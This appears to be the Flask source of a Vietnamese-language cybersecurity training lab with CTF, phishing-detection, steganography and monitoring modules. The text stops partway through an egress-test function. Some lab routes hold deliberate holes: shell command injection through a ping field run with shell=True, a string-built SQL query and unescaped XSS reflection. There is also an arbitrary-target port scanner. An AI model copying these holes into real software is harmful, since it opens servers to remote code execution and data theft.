import eventlet
eventlet.monkey_patch()

import os
import time
import threading
import socket
import platform
import psutil
import requests
import re
import json
import sqlite3
import hmac
import hashlib
import base64
import subprocess
import ipaddress
import joblib
import urllib3
from datetime import datetime
from urllib.parse import urlparse, urljoin
from dotenv import load_dotenv

# Load biến môi trường từ file .env
load_dotenv()

# Đường dẫn gốc của project (dùng cho path tuyệt đối)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

from flask import Flask, render_template, redirect, url_for, request, flash, jsonify, abort, session
from flask_sqlalchemy import SQLAlchemy
from flask_mail import Mail, Message
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_socketio import SocketIO
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from itsdangerous import URLSafeTimedSerializer
from cryptography.fernet import Fernet
from flask_wtf.csrf import CSRFProtect

# Tắt cảnh báo khi ping HTTPS mục tiêu
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- QUAN TRỌNG: Phải định nghĩa hàm này y hệt như bên file train ---
def custom_tokenizer(url):
    return str(url).split('.')

# --- KIỂM TRA THƯ VIỆN ---
try:
    from stegano import lsb
    from PIL import Image
except ImportError:
    print("Thiếu thư viện! Hãy chạy: pip install stegano pillow")

try:
    import pyotp
except ImportError:
    print("Thiếu thư viện! Hãy chạy: pip install pyotp")
    exit()

# ==========================================
# 1. CẤU HÌNH APP & DATABASE
# ==========================================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'fallback-dev-key-change-me')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Thư mục upload
app.config['UPLOAD_FOLDER'] = 'uploads_temp'
app.config['STEGO_FOLDER'] = 'static/stego_uploads'
for folder in [app.config['UPLOAD_FOLDER'], app.config['STEGO_FOLDER']]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# Cấu hình Mail (đọc từ .env)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER')

# Khởi tạo Plugins
db = SQLAlchemy(app)
mail = Mail(app)
csrf = CSRFProtect(app)
s = URLSafeTimedSerializer(app.config['SECRET_KEY'])
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Khởi tạo SocketIO
socketio = SocketIO(app, async_mode='eventlet')

# API Key (đọc từ .env)
ABUSEIPDB_KEY = os.environ.get('ABUSEIPDB_KEY', '')

# Target URL (đọc từ .env)
CTF_TARGET_URL = os.environ.get('TARGET_URL', 'http://42.96.19.122/')

# Load ML model một lần khi khởi động (tránh load lại mỗi request)
MODEL_PATH = os.path.join(BASE_DIR, 'phishing_model.pkl')
phishing_model = joblib.load(MODEL_PATH) if os.path.exists(MODEL_PATH) else None
if phishing_model:
    print(">>> Phishing detection model loaded successfully.")
else:
    print(">>> WARNING: phishing_model.pkl not found. Run train_model.py first.")

# Helper: kiểm tra URL redirect có an toàn không (chống Open Redirect)
def is_safe_url(target):
    if not target:
        return False
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return (test_url.scheme in ('http', 'https') and
            ref_url.netloc == test_url.netloc)

# ==========================================
# 2. DATABASE MODELS
# ==========================================
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=False)
    password = db.Column(db.String(150), nullable=False)
    role = db.Column(db.String(50), default='user')
    totp_secret = db.Column(db.String(32), nullable=True)
    score = db.Column(db.Integer, default=0)
    solved_challenges = db.Column(db.String(500), default="")

class Feedback(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    content = db.Column(db.String(1000), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class AuditLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    action = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Challenge(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100))
    description = db.Column(db.String(500))
    flag = db.Column(db.String(100))
    points = db.Column(db.Integer)
    category = db.Column(db.String(50))

class TrafficLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(50), nullable=False)
    endpoint = db.Column(db.String(200), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class TargetPingLog(db.Model):
    """Lưu lịch sử ping đến CTF target server."""
    id = db.Column(db.Integer, primary_key=True)
    target_url = db.Column(db.String(200), nullable=False)
    status = db.Column(db.String(20), nullable=False)   # Online / Offline / Warning
    http_code = db.Column(db.Integer, nullable=True)
    latency_ms = db.Column(db.Integer, nullable=True)   # ms
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class TargetRequestLog(db.Model):
    """Lưu các request từ Lab gửi đến CTF target."""
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    username = db.Column(db.String(150), nullable=True)
    action = db.Column(db.String(200), nullable=False)  # mô tả hành động
    target = db.Column(db.String(200), nullable=False)  # IP/URL đích
    result = db.Column(db.String(100), nullable=True)   # kết quả (status, open, blocked...)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class QuizQuestion(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    category = db.Column(db.String(50), nullable=False)  # kill_chain, windows_internals, ad_network
    question = db.Column(db.String(500), nullable=False)
    options = db.Column(db.Text, nullable=False)  # JSON array string
    correct_index = db.Column(db.Integer, nullable=False)
    explanation = db.Column(db.Text, nullable=True)

class QuizProgress(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    question_id = db.Column(db.Integer, db.ForeignKey('quiz_question.id'), nullable=False)
    correct = db.Column(db.Boolean, default=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Scenario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=True)

class ScenarioStep(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    scenario_id = db.Column(db.Integer, db.ForeignKey('scenario.id'), nullable=False)
    order = db.Column(db.Integer, nullable=False)
    situation_text = db.Column(db.Text, nullable=False)
    options = db.Column(db.Text, nullable=False)  # JSON array string: [{text, next_step_id, is_correct, feedback}]

class IocProgress(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    ioc_id = db.Column(db.Integer, nullable=False)
    submitted_technique = db.Column(db.String(100), nullable=True)
    submitted_defense = db.Column(db.Text, nullable=True)
    is_correct = db.Column(db.Boolean, default=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))

def log_action(action):
    if current_user.is_authenticated:
        try:
            new_log = AuditLog(user_id=current_user.id, action=action)
            db.session.add(new_log)
            db.session.commit()
            
            # Emit event cho Dashboard Real-time
            socketio.emit('new_log', {
                'id': new_log.id,
                'user': current_user.username,
                'action': action,
                'timestamp': new_log.timestamp.strftime('%Y-%m-%d %H:%M:%S')
            }, namespace='/soc')
        except Exception as e:
            app.logger.error(f"Lỗi log_action: {e}")
            db.session.rollback()

def log_target_request(action, target, result=None):
    """Ghi log request từ Lab ra target server và broadcast qua SocketIO."""
    try:
        username = current_user.username if current_user.is_authenticated else 'anonymous'
        user_id = current_user.id if current_user.is_authenticated else None
        entry = TargetRequestLog(
            user_id=user_id,
            username=username,
            action=action,
            target=target,
            result=result
        )
        db.session.add(entry)
        db.session.commit()
        socketio.emit('target_request', {
            'username': username,
            'action': action,
            'target': target,
            'result': result or '',
            'timestamp': entry.timestamp.strftime('%H:%M:%S')
        }, namespace='/soc')
    except Exception as e:
        app.logger.error(f"Lỗi log_target_request: {e}")
        db.session.rollback()

def _ping_target_loop():
    """Background thread: ping CTF target mỗi 1 giây, emit qua SocketIO."""
    while True:
        try:
            url = os.environ.get('TARGET_URL', 'http://42.96.19.122/')
            status, code, latency, color = 'Offline', None, None, '#ff4444'
            try:
                resp = requests.get(url, timeout=5, verify=False)
                latency = round(resp.elapsed.total_seconds() * 1000)
                code = resp.status_code
                if code == 200:
                    status, color = 'Online', '#00C851'
                else:
                    status, color = f'Warning ({code})', '#ffbb33'
            except Exception:
                pass

            with app.app_context():
                entry = TargetPingLog(
                    target_url=url,
                    status=status,
                    http_code=code,
                    latency_ms=latency
                )
                db.session.add(entry)
                db.session.commit()

                socketio.emit('target_ping', {
                    'url': url,
                    'status': status,
                    'code': code or 'N/A',
                    'latency': f'{latency} ms' if latency else 'N/A',
                    'color': color,
                    'timestamp': entry.timestamp.strftime('%H:%M:%S')
                }, namespace='/soc')
        except Exception as e:
            with app.app_context():
                app.logger.error(f"Ping loop error: {e}")
        time.sleep(1)

# ==========================================
# 3. MIDDLEWARE (CHỐNG DDOS & SOC)
# ==========================================
IP_TRACKER = {}
BLACKLIST = set() 
REQUEST_LIMIT = 30 
TIME_WINDOW = 10   

@app.before_request
def ddos_shield_and_log():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if ip in BLACKLIST:
        return "BẠN ĐÃ BỊ CHẶN VÌ CÓ DẤU HIỆU DDOS/SPAM!", 429
        
    if request.endpoint and ('static' in request.endpoint or 'api_monitor_data' in request.endpoint):
        return

    current_time = time.time()
    if ip not in IP_TRACKER:
        IP_TRACKER[ip] = []
        
    IP_TRACKER[ip] = [t for t in IP_TRACKER[ip] if current_time - t < TIME_WINDOW]
    IP_TRACKER[ip].append(current_time)
    
    if len(IP_TRACKER[ip]) > REQUEST_LIMIT:
        BLACKLIST.add(ip)
        print(f"!!! CẢNH BÁO: ĐÃ BLOCK IP {ip} VÌ TẤN CÔNG DDOS !!!")
        socketio.emit('new_alert', {
            'type': 'DDoS Blocked',
            'ip': ip,
            'timestamp': datetime.utcnow().strftime('%H:%M:%S')
        }, namespace='/soc')
        return "BẠN ĐÃ BỊ CHẶN VÌ CÓ DẤU HIỆU DDOS/SPAM!", 429

    try:
        log = TrafficLog(ip_address=ip, endpoint=request.path)
        db.session.add(log)
        db.session.commit()
        
        socketio.emit('new_traffic', {
            'ip': ip,
            'endpoint': request.path,
            'timestamp': log.timestamp.strftime('%H:%M:%S')
        }, namespace='/soc')
    except Exception as e:
        print("Lỗi lưu TrafficLog:", e)

# ==========================================
# 4. ROUTES AUTH & PASSWORD RECOVERY
# ==========================================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        remember = True if request.form.get('remember') else False

        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            flash('Đăng nhập thành công!', 'success')
            # Fix Open Redirect: validate URL trước khi redirect
            next_url = request.args.get('next')
            if next_url and is_safe_url(next_url):
                return redirect(next_url)
            return redirect(url_for('dashboard'))
        else:
            flash('Sai tài khoản hoặc mật khẩu!', 'error')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated: return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')

        if len(username) < 3:
            flash('Tên đăng nhập phải có ít nhất 3 ký tự!', 'error')
            return render_template('register.html')

        email_regex = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_regex, email):
            flash('Địa chỉ email không hợp lệ!', 'error')
            return render_template('register.html')

        if len(password) < 8:
            flash('Mật khẩu phải có ít nhất 8 ký tự!', 'error')
            return render_template('register.html')

        if User.query.filter((User.username == username) | (User.email == email)).first():
            flash('Tên đăng nhập hoặc Email đã được sử dụng!', 'error')
        else:
            hashed_password = generate_password_hash(password, method='pbkdf2:sha256')
            new_user = User(email=email, username=username, password=hashed_password, role='user')
            db.session.add(new_user)
            db.session.commit()
            flash('Đăng ký thành công! Vui lòng đăng nhập.', 'success')
            return redirect(url_for('login'))
            
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email')
        user = User.query.filter_by(email=email).first()
        
        if user:
            token = s.dumps(user.email, salt='reset-password')
            link = url_for('reset_password', token=token, _external=True)
            
            # (Lab Mode): In link ra Terminal để lấy link nhanh khi Render chặn mail
            print(f">>> LINK KHÔI PHỤC (LAB MODE): {link}")
            flash('Đã gửi link khôi phục! Kiểm tra email (hoặc xem Terminal nếu dùng Lab Mode).', 'success')

            # Code gửi mail thật (Chỉ chạy được ở máy Local, Render miễn phí sẽ bị lỗi 502)
            try:
                msg = Message('Khôi phục mật khẩu - CyberSec Lab', recipients=[email])
                msg.body = f"Chào {user.username},\nBấm vào đây để đổi mật khẩu:\n{link}"
                mail.send(msg)
            except Exception as mail_err:
                app.logger.warning(f"Gửi mail thất bại: {mail_err}")
                
        else:
            flash('Email này chưa được đăng ký!', 'error')
    return render_template('forgot_password.html')

@app.route('/reset_password/<token>', methods=['GET', 'POST'])
def reset_password(token):
    try:
        email = s.loads(token, salt='reset-password', max_age=300)
    except:
        flash('Link không hợp lệ hoặc hết hạn!', 'error')
        return redirect(url_for('forgot_password'))
    
    if request.method == 'POST':
        user = User.query.filter_by(email=email).first()
        if user:
            user.password = generate_password_hash(request.form.get('password'), method='pbkdf2:sha256')
            db.session.commit()
            flash('Đổi mật khẩu thành công!', 'success')
            return redirect(url_for('login'))
    return render_template('reset_password.html')

# ==========================================
# 5. CORE & ADMIN ROUTES
# ==========================================
@app.route('/')
def index(): return render_template('index.html')

@app.route('/about')
def about(): return render_template('about.html')

@app.route('/dashboard')
@login_required
def dashboard(): return render_template('dashboard.html', name=current_user.username)

@app.route('/admin')
@login_required
def admin():
    if current_user.role != 'admin': return redirect(url_for('dashboard'))
    logs = AuditLog.query.order_by(AuditLog.timestamp.desc()).limit(50).all()
    return render_template('admin.html', logs=logs)

@app.route('/submit_feedback', methods=['POST'])
@login_required
def submit_feedback():
    noi_dung = request.form.get('content') 
    if noi_dung:
        new_feedback = Feedback(username=current_user.username, content=noi_dung)
        db.session.add(new_feedback)
        db.session.commit()
        flash('Cảm ơn bạn đã đóng góp ý kiến!', 'success')
    else:
        flash('Vui lòng nhập nội dung góp ý.', 'error')
    return redirect(url_for('dashboard'))

@app.route('/admin/feedbacks')
@login_required
def admin_feedbacks():
    if current_user.role != 'admin': abort(403) 
    all_feedbacks = Feedback.query.order_by(Feedback.timestamp.desc()).all()
    return render_template('feedbacks.html', feedbacks=all_feedbacks)

# --- SOC MONITORING ---
@app.route('/admin/monitor')
@login_required
def system_monitor():
    if current_user.role != 'admin': abort(403)
        
    cpu_usage = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    total_visits = TrafficLog.query.count()
    recent_traffic = TrafficLog.query.order_by(TrafficLog.timestamp.desc()).limit(50).all()
    
    # Ping Target CTF (URL đọc từ .env)
    target_url = CTF_TARGET_URL
    target_status = "Offline"
    target_ping = "N/A"
    status_color = "#ff4444"

    try:
        response = requests.get(target_url, timeout=5, verify=False)
        target_ping = f"{round(response.elapsed.total_seconds() * 1000)} ms"
        if response.status_code == 200:
            target_status = "Online"
            status_color = "#00C851"
        else:
            target_status = f"Warning (HTTP {response.status_code})"
            status_color = "#ffbb33"
    except Exception as e:
        app.logger.debug(f"Target ping failed: {e}")

    return render_template('monitor.html',
                           cpu=cpu_usage, ram=ram.percent, disk=disk.percent,
                           total_visits=total_visits, traffic=recent_traffic,
                           target_url=target_url, target_status=target_status,
                           target_ping=target_ping, target_color=status_color)

@app.route('/admin/api/monitor_data')
@login_required
def api_monitor_data():
    if current_user.role != 'admin': abort(403)
        
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    
    target_url = CTF_TARGET_URL
    target_status, target_ping, target_color = "Offline", "N/A", "#ff4444"
    try:
        res = requests.get(target_url, timeout=2, verify=False)
        target_ping = f"{round(res.elapsed.total_seconds() * 1000)} ms"
        if res.status_code == 200:
            target_status, target_color = "Online", "#00C851"
    except Exception as e:
        app.logger.debug(f"Target ping failed: {e}")
        
    return jsonify({
        "cpu": cpu, "ram": ram,
        "target_status": target_status, "target_ping": target_ping, "target_color": target_color,
        "total_visits": TrafficLog.query.count(),
        "blocked_ips": list(BLACKLIST)
    })

# ==========================================
# 6. LAB MODULES
# ==========================================
@app.route('/xss', methods=['GET', 'POST'])
@login_required
def xss_lab():
    result_unsafe = ""
    result_safe = ""
    if request.method == 'POST':
        user_input = request.form.get('payload', '')[:2000]
        mode = request.form.get('mode')
        if mode == 'unsafe':
            result_unsafe = user_input
            if '<' in user_input: log_action('XSS Attack Attempted (Sandboxed Reflected Lab)')
        else:
            result_safe = user_input
    return render_template('xss.html', unsafe=result_unsafe, safe=result_safe)

@app.route('/credential_lab', methods=['GET', 'POST'])
@login_required
def credential_lab():
    # Isolated teaching simulation: fixed mock users, session-scoped attempts,
    # no authentication against real accounts and no submitted password storage.
    demo_users = {'alex': 'BlueTeam!23', 'analyst': 'LogReview!7', 'admin-demo': 'LabOnly!42'}
    state = session.get('credential_lab', {'attempts': 0, 'locked': False, 'pending_user': None, 'authenticated': False})
    message = None
    message_type = 'info'

    if request.method == 'POST':
        action = request.form.get('action', 'guess')
        if action == 'reset':
            state = {'attempts': 0, 'locked': False, 'pending_user': None, 'authenticated': False}
            message = 'Đã đặt lại mô phỏng trong phiên hiện tại.'
        elif action == 'otp':
            otp = request.form.get('otp', '')[:12]
            if state.get('pending_user') and otp == '246810':
                state['authenticated'] = True
                message, message_type = 'Xác thực mô phỏng thành công: mật khẩu đúng và mã MFA demo hợp lệ.', 'success'
            else:
                message, message_type = 'Mã MFA demo chưa đúng. Hãy dùng mã minh họa 246810.', 'error'
        elif state.get('authenticated'):
            message, message_type = 'Mô phỏng đã hoàn tất. Hãy đặt lại để thử lại.', 'info'
        elif state.get('locked'):
            message, message_type = 'Mô phỏng đã khóa sau 5 lần thử sai; hãy đặt lại để bắt đầu lại.', 'error'
        else:
            username = request.form.get('username', '')
            password = request.form.get('password', '')[:128]
            if username not in demo_users:
                message, message_type = 'Hãy chọn một tài khoản giả lập có sẵn.', 'error'
            elif password == demo_users[username]:
                state['pending_user'] = username
                message, message_type = 'Mật khẩu mẫu đúng. Mô phỏng yêu cầu bước MFA tiếp theo.', 'success'
            else:
                state['attempts'] = min(int(state.get('attempts', 0)) + 1, 5)
                if state['attempts'] >= 5:
                    state['locked'] = True
                    message = 'Đã đạt giới hạn 5 lần thử. Khóa phiên mô phỏng đã được kích hoạt.'
                else:
                    message = f'Mật khẩu không khớp. Còn {5 - state["attempts"]} lần thử trong mô phỏng.'
                message_type = 'error'
        session['credential_lab'] = state

    return render_template('credential_lab.html', attempts=state.get('attempts', 0),
                           locked=state.get('locked', False), pending_user=state.get('pending_user'),
                           authenticated=state.get('authenticated', False), message=message,
                           message_type=message_type)

@app.route('/cmd_injection', methods=['GET', 'POST'])
@login_required
def cmd_injection():
    output = ""
    if request.method == 'POST':
        target_ip = request.form.get('ip')
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = f"ping {param} 1 {target_ip}" 
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
            if '&' in target_ip or '|' in target_ip or ';' in target_ip:
                log_action('Command Injection RCE Detected!')
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            output = str(e)
    return render_template('cmd_injection.html', output=output)

@app.route('/steganography', methods=['GET', 'POST'])
@login_required
def steganography():
    hidden_img_url, revealed_message, error = None, None, None
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'encode':
            if 'image' not in request.files: error = 'Chưa chọn ảnh!'
            else:
                file = request.files['image']
                message = request.form.get('message', '')
                if file.filename == '': error = 'Chưa chọn file ảnh!'
                elif not message: error = 'Chưa nhập tin nhắn bí mật!'
                else:
                    filename = secure_filename(file.filename)
                    input_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                    file.save(input_path)
                    output_filename = f"secret_{filename.split('.')[0]}.png"
                    output_path = os.path.join(app.config['STEGO_FOLDER'], output_filename)
                    try:
                        encoded_message = base64.b64encode(message.encode('utf-8')).decode('utf-8')
                        secret = lsb.hide(input_path, encoded_message)
                        secret.save(output_path)
                        hidden_img_url = url_for('static', filename=f'stego_uploads/{output_filename}')
                    except Exception as e: error = f"Lỗi: {str(e)}"

        elif action == 'decode':
            if 'stego_image' not in request.files: error = 'Chưa chọn ảnh!'
            else:
                file = request.files['stego_image']
                if file.filename == '': error = 'Chưa chọn file!'
                else:
                    filename = secure_filename(file.filename)
                    input_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                    file.save(input_path)
                    try:
                        raw_message = lsb.reveal(input_path)
                        if raw_message:
                            try: revealed_message = base64.b64decode(raw_message).decode('utf-8')
                            except: revealed_message = raw_message
                        else: error = "Không tìm thấy tin nhắn!"
                    except Exception as e: error = f"Lỗi: {str(e)}"
    return render_template('steganography.html', hidden_img_url=hidden_img_url, revealed_message=revealed_message, error=error)

@app.route('/ctf', methods=['GET', 'POST'])
@login_required
def ctf():
    challenges = Challenge.query.all()
    solved_list = current_user.solved_challenges.split(',')
    if request.method == 'POST':
        chal_id = request.form.get('chal_id')
        flag_submit = request.form.get('flag').strip()
        chal = db.session.get(Challenge, int(chal_id))
        
        if str(chal.id) in solved_list: flash('Bạn đã giải bài này rồi!', 'info')
        elif chal.flag == flag_submit:
            current_user.score += chal.points
            current_user.solved_challenges += f"{chal.id},"
            db.session.commit()
            flash(f'Chính xác! +{chal.points} điểm.', 'success')
            log_action(f'Solved CTF: {chal.title}')
        else:
            flash('Flag sai rồi, thử lại nhé.', 'incorrect')
        return redirect(url_for('ctf'))
    return render_template('ctf.html', challenges=challenges, solved_list=solved_list, score=current_user.score)

@app.route('/threat_intel', methods=['GET', 'POST'])
@login_required
def threat_intel():
    data, error = None, None
    if request.method == 'POST':
        ip = request.form.get('ip_address', '').strip()
        # Validate định dạng IP trước khi gọi API
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            error = "Địa chỉ IP không hợp lệ! Vui lòng nhập IPv4 hoặc IPv6 đúng định dạng."
            return render_template('threat_intel.html', data=data, error=error)

        if not ABUSEIPDB_KEY:
            error = "Chưa cấu hình ABUSEIPDB_KEY trong file .env!"
            return render_template('threat_intel.html', data=data, error=error)

        try:
            response = requests.get('https://api.abuseipdb.com/api/v2/check',
                                    headers={'Accept': 'application/json', 'Key': ABUSEIPDB_KEY},
                                    params={'ipAddress': ip, 'maxAgeInDays': '90'})
            if response.status_code == 200: data = response.json()['data']
            elif response.status_code == 401: error = "Lỗi: API Key không hợp lệ!"
            elif response.status_code == 429: error = "Hết lượt truy cập API hôm nay."
            else: error = f"Lỗi HTTP: {response.status_code}"
        except Exception as e: error = f"Lỗi kết nối: {str(e)}"
    return render_template('threat_intel.html', data=data, error=error)

@app.route('/ai_phishing', methods=['GET', 'POST'])
@login_required
def ai_phishing():
    result, prob, url_input = None, 0, ""
    if request.method == 'POST':
        url_input = request.form.get('url', '').strip()
        try:
            if phishing_model is None:
                flash('Chưa tìm thấy model AI! Hãy chạy train_model.py trước.', 'danger')
            else:
                prediction = phishing_model.predict([url_input])[0]
                prob = round(phishing_model.predict_proba([url_input])[0][1] * 100, 2)
                if prediction == 1 or prob > 50:
                    result = "PHISHING (NGUY HIỂM)"
                    log_action(f'AI Alert: Phishing - {url_input}')
                else:
                    result = "SAFE (AN TOÀN)"
        except Exception as e:
            result = f"Lỗi AI: {str(e)}"
    return render_template('ai_phishing.html', result=result, prob=prob, url=url_input)

# Các Lab Khác
@app.route('/digital_auth', methods=['GET', 'POST'])
@login_required
def digital_auth():
    if not current_user.totp_secret:
        current_user.totp_secret = pyotp.random_base32()
        db.session.commit()
    secret = current_user.totp_secret
    totp = pyotp.TOTP(secret)
    status = "SUCCESS" if request.method == 'POST' and totp.verify(request.form.get('otp_code')) else ("FAILED" if request.method=='POST' else None)
    return render_template('digital_auth.html', secret=secret, current_code=totp.now(), status=status)

@app.route('/ecommerce', methods=['GET', 'POST'])
@login_required
def ecommerce():
    res = None
    if request.method == 'POST':
        cc = request.form.get('cc_number','').replace(' ','')
        digits = [int(d) for d in str(cc) if d.isdigit()]
        checksum = sum(digits[-1::-2]) + sum([sum(divmod(d*2,10)) for d in digits[-2::-2]])
        valid = (checksum % 10 == 0) and (len(digits)>12)
        key = Fernet.generate_key()
        res = {'is_valid': valid, 'enc': Fernet(key).encrypt(f"{cc}".encode()).decode()}
    return render_template('ecommerce.html', result=res)

@app.route('/pentest_red', methods=['GET', 'POST'])
@login_required
def pentest_red():
    res, q = None, ""
    conn = sqlite3.connect(':memory:')
    try:
        conn.cursor().execute("CREATE TABLE u (u TEXT, p TEXT, f TEXT)").execute("INSERT INTO u VALUES ('admin','123','FLAG{SQL_WIN}')")
        if request.method == 'POST':
            i, m = request.form.get('username_input'), request.form.get('method')
            sql = f"SELECT * FROM u WHERE u = '{i}'" if m == 'unsafe' else "SELECT * FROM u WHERE u = ?"
            try:
                cur = conn.cursor()
                cur.execute(sql) if m == 'unsafe' else cur.execute(sql, (i,))
                res = cur.fetchall()
                q = sql
                if len(res) > 0 and m == 'unsafe': log_action('SQLi Attack')
            except Exception as e: res = str(e)
    finally:
        conn.close()  # Đảm bảo luôn đóng connection
    return render_template('pentest_red.html', result=res, query=q)

@app.route('/blue_team')
@login_required
def blue_team():
    logs = AuditLog.query.order_by(AuditLog.timestamp.desc()).limit(30).all()
    stats = {
        'total': AuditLog.query.count(),
        'attacks': AuditLog.query.filter(AuditLog.action.contains('Attack') | AuditLog.action.contains('SQLi') | AuditLog.action.contains('Detected')).count(),
        'solves': AuditLog.query.filter(AuditLog.action.contains('Solved')).count(),
        'users': User.query.count(),
        'top_user': getattr(User.query.order_by(User.score.desc()).first(), 'username', 'N/A')
    }
    return render_template('blue_team.html', logs=logs, stats=stats)

@app.route('/red_team')
@login_required
def red_team():
    attack_logs = AuditLog.query.filter(AuditLog.action.contains('Attack') | AuditLog.action.contains('Detected')).order_by(AuditLog.timestamp.desc()).limit(10).all()
    attack_count = AuditLog.query.filter(AuditLog.action.contains('Attack') | AuditLog.action.contains('Detected')).count()
    metrics = {
        'web_exposure': min(attack_count * 20, 100),
        'network_risk': min(attack_count * 10, 100),
        'total_attacks': attack_count
    }
    return render_template('red_team.html', attack_logs=attack_logs, metrics=metrics)

@app.route('/vulnerability', methods=['GET', 'POST'])
@login_required
def vulnerability():
    results, error, target = None, None, None

    if request.method == 'POST':
        target = request.form.get('target_ip', '').strip()

        if not target:
            error = "Vui lòng nhập địa chỉ IP hoặc hostname!"
            return render_template('vulnerability.html', error=error, target=target)

        # Resolve hostname → IP để hiển thị và scan
        try:
            resolved_ip = socket.gethostbyname(target)
        except socket.gaierror:
            error = f"Không thể phân giải hostname: '{target}'. Kiểm tra lại địa chỉ."
            return render_template('vulnerability.html', error=error, target=target)

        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 443, 3306, 5432, 8080, 8443]
        results = []

        log_action(f'Port Scan: {target} ({resolved_ip})')

        for port in COMMON_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                conn_result = sock.connect_ex((resolved_ip, port))
                sock.close()
                status = 'OPEN' if conn_result == 0 else 'CLOSED'
            except Exception:
                status = 'CLOSED'
            results.append({'port': port, 'status': status})

        # Log target request nếu scan vào CTF target
        target_host = os.environ.get('TARGET_URL', '').replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        if target_host and (target_host in target or resolved_ip == target_host):
            open_ports = [r['port'] for r in results if r['status'] == 'OPEN']
            log_target_request('Port Scan', target, f"{len(open_ports)} port mở: {open_ports}")

    return render_template('vulnerability.html', results=results, error=error, target=target)

@app.route('/malware', methods=['GET', 'POST'])
@login_required
def malware(): return render_template('malware.html')

@app.route('/rsa', methods=['GET', 'POST'])
@login_required
def rsa_tool(): return render_template('rsa.html')

@app.route('/system_security')
@login_required
def system_security(): return render_template('system_security.html')

@app.route('/assessment', methods=['GET', 'POST'])
@login_required
def assessment(): return render_template('assessment.html')

@app.route('/hmac', methods=['GET', 'POST'])
@login_required
def hmac_tool(): return render_template('hmac.html')

@app.route('/egress_test', methods=['GET', 'POST'])
@login_required
def egress_test():
    results = None
    target_host = "portquiz.net"
    if request.method == 'POST':
        ports_input = request.form.get('ports', '21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443')
        target_override = request.form.get('target', '').strip()
        if target_override:
            target_host = target_override

        ports_list = []
        for p in ports_input.split(','):
            p = p.strip()
            if p.isdigit() and 1 <= int(p) <= 65535:
                ports_list.append(int(p))

        results = []
        log_action('Egress/Firewall Test executed')
        
        for port in ports_list:
            try:
